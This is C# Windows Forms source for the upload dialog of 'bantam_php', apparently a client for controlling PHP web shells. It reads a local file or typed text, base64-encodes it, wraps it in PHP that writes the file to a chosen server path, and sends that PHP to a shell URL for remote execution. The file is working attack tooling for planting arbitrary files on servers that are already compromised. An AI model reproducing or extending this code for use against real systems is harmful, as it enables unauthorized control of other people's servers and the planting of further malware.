using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace bantam_php
{
    public partial class UploadFile : Form
    {
        public string LocalFileLocation { get; set; }
        public string ServerPath { get; set; }
        public string ShellUrl { get; set; }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="shellUrl"></param>
        /// <param name="serverPath"></param>
        public UploadFile(string shellUrl, string serverPath)
        {
            InitializeComponent();

            ShellUrl = shellUrl;
            lblDynPath.Text = ServerPath = serverPath;
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void btnBrowse_Click(object sender, EventArgs e)
        {
            using (var openShellXMLDialog = new OpenFileDialog {
                Filter = "All files (*.*)|*.*|" 
                       + "PHP files (*.php)|*.php|"
                       + "Text files (*.txt)|*.txt|"
                       + "SH files (*.sh)|*.sh|"
                       + "Python files (*.py)|*.py|"
                       + "HTML files (*.html|*.html|"
                       + "C files (*.c|*.c",
                FilterIndex = 1,
                RestoreDirectory = false
            }) {
                if (openShellXMLDialog.ShowDialog() == DialogResult.OK) {
                    LocalFileLocation = openShellXMLDialog.FileName;

                    List<string> displayableFileExtensions = new List<string> {
                        ".php",
                        ".txt",
                        ".html",
                        ".sh",
                        ".xml",
                        ".c",
                        ".cpp",
                        ".h",
                        ".pl",
                        ".asp",
                        ".aspx",
                        ".py",
                        ".js",
                        ".jsp"
                    };

                    string ext = Path.GetExtension(LocalFileLocation);

                    if (displayableFileExtensions.Contains(ext)) {
                        string text = string.Empty;
                        using (StreamReader sr = new StreamReader(LocalFileLocation)) {
                            text = sr.ReadToEnd();
                        }

                        richTextBox1.Text = text;
                    } else {
                        richTextBox1.Text = "Cannot diplay that files contents...";
                    }
                    btnUpload.Enabled = true;
                }
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void btnUpload_Click(object sender, EventArgs e)
        {
            string b64FileContents = string.Empty;

            if (!string.IsNullOrEmpty(LocalFileLocation)) {
                byte[] fileContents = File.ReadAllBytes(LocalFileLocation);
                b64FileContents = Convert.ToBase64String(fileContents);
            } else if (!string.IsNullOrEmpty(richTextBox1.Text)) {
                b64FileContents = Helper.EncodeBase64ToString(richTextBox1.Text);
            } else {
                //todo level 3 logging
                return;
            }
            string remoteFileLocation = ServerPath + "/" + txtBoxFileName.Text;
            string phpCode = PhpHelper.WriteFile(remoteFileLocation, b64FileContents);

            await WebHelper.ExecuteRemotePHP(ShellUrl, phpCode, true);
           // GC.Collect();
            this.Close();
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void richTextBox1_TextChanged(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(richTextBox1.Text)) {
                btnUpload.Enabled = false;
            } else {
                btnUpload.Enabled = true;
            }
        }
    }
}
